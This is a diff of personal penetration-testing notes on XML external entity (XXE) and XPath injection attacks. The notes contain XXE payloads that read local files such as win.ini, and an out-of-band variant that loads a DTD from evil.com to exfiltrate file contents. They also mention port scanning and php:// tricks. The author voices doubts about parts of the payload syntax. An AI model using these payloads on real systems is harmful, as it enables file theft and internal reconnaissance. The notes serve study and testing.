@@ -744,7 +744,6 @@ the XML generator or
 parser is the target of
 the attack.
 
-
 </base knowledge of XML>
 
 [+] XML External entities
@@ -771,18 +770,35 @@ Your code will get parsed in another app and you'll get the $$$.
 </payment>
 </batchjob>
 
+[+] XPath injection.
+http://www.w3schools.com/xsl/xpath_syntax.asp  //Xpath syntax tutorial
+https://www.owasp.org/index.php/XPATH_Injection //really simplistic
+
+If you want to find something  in xml document, you use xpaths. For example, querying "/a/b/c" will output "The value" in this: <a><b><c>The value</c></b></a>
+Thus, we get xpath injections.
+
+If you want to find out other values of the xml document (like passwords) using xpath injection, you can probably do blind xpath injection.
+
+
 [+] 2014 Whitepapaer that's a great resource when pentesting XXE. From the same guys that did the OWASP talk below.
 http://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf
+"External Resource Inclusion via XInclude Support" - this can do pretty much everything external entities can do.
+
+[+] THINGS NOT TO FUCK UP WHEN DOING XXE:
+1) URL encode everything - especiall '&'
+2) <!DOCTYPE blablabla    <--- doctype's closing bracket is only at the end!
+3) You have to put the file:// before getting a file!
 
 [+] SUMMARY OF OWASP TALK - Stealing data using XXE (From 2013 - check OWASP if anything's changed):
 https://www.youtube.com/watch?v=eHSNT8vWLfc
 (CTRL+F "(EXPLOIT) PARTS IF IN A HURRY. The rest is for better understanding.)
 
-(*)You can't do it without pulling some tricks. If you do: 
+(*)(EXPLOIT)You can do it without pulling some tricks (With limitations). This allows you to steal things like /etc/passwd
+If you do:
 
 <!DOCTYPE updateProfile [
 	<!ENTITY stolenFile SYSTEM "file:///C:/Windows/win.ini">
-]]> 
+]]>    //I think there should only be one closing bracket here? When I tested on Web For Pentester, then it worked with 1 bracket.
 <updateProfile>
 	<name>&stolenFile<name>
 </updateProfile>
@@ -819,7 +835,7 @@ surround any include in CDATA tags, which means to interpret it as raw text.
 	<!ENTITY % dtd SYSTEM "http://evil.com/join.dtd">
  	//By writing it out we are effectively executing the parameter entity as an entity
  	%dtd;
-]]>
+]]>  //Only one closing bracket?
  
 //This is the join.dtd on our website
 <!ENTITY all "%start;%file;%end">
@@ -827,8 +843,8 @@ surround any include in CDATA tags, which means to interpret it as raw text.
 //This is the field
 <name>&all</name>
 
-This allows you to read well-formed xml documents. Still some restrictions:
-	1) Needs well-formed XML document
+This allows you to read well-formed xml documents (you can probably also use this to port scan internal services by doing http:// instead of file://). Still some restrictions:
+	1) Needs well-formed XML document   //I'm not sure if this is true.
 	2) No binary
 	3) Still requires that you get that data back somehow (for example by viewing your profile)
 
@@ -837,8 +853,9 @@ This allows you to read well-formed xml documents. Still some restrictions:
 	2) either " or ' will cause the error 
 	3) # will cause URL truncation //both 2) and 3) are because of the send entity. If you imagine how variables are placed into that query, you'll understand why that is.
 
-(*) You can use URL protocols to do cool things. In many cases, this is usable without external entity support! (Because if you just put in a DOCTYPE that asks for a dtd from the internet, then you're not actually using external entities. For example, you can do the jar:// things without needing external entities)
-Look at 15:21 of video to see which platforms give you which options
+(*) You can use URL protocols to do cool things. External entity support may or may not be necessary (depends if you do the inclusion in <!ENTITY ...> or <!DOCTYPE ...>)
+Note: This is (as I understand it) done by doing the thing where you ask the parser to pull a DTD from a website.
+Look at 15:21 of video to see which platforms give you which options (also read the whitepaper in the [+] above this one.
 
 (*)If they're using PHP, you can get also get binary through the use of URL protocols. (php://base64 transition)
 
